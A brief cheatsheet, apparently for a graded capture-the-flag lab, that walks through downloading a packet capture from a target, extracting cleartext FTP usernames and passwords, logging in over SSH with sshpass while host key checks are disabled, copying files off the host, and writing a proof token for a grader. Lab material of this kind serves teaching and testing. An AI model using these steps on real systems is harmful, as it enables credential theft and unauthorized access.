# Cheatsheet — capture → creds → proof

## Pull and inspect the pcap

```bash
curl -s http://$T:8080/capture.pcap -o cap.pcap
tshark -r cap.pcap -q -z io,phs        # protocol overview
```

## Extract cleartext credentials

```bash
tshark -r cap.pcap -Y ftp -T fields \
  -e ftp.request.command -e ftp.request.arg
# or quick-and-dirty:
strings cap.pcap | grep -E 'USER|PASS'
```

## Non-interactive SSH

```bash
sshpass -p 'PASS' ssh -o StrictHostKeyChecking=no \
    user@$T 'remote command'
sshpass -p 'PASS' scp user@$T:/path/file .
```

## Leave structured proof

```bash
ssh ... 'echo analysis-complete > ~/proof.txt'
```

The grader greps for the exact token — no timestamps or commentary in the
proof file.
